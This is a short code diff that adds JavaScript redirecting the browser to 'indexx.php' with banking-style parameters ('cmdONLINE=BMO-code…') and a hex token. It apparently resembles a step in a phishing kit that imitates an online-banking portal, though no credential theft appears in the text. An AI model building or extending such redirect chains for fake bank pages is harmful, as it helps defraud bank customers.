@@ -1,0 +1,4 @@
+
+loc = "indexx.php?0hrcode-myonportal=6&cmdONLINE=BMO-code61573a29062385c29bcdc1bbbe18465e"
+self.location.replace(loc);
+window.location = loc;
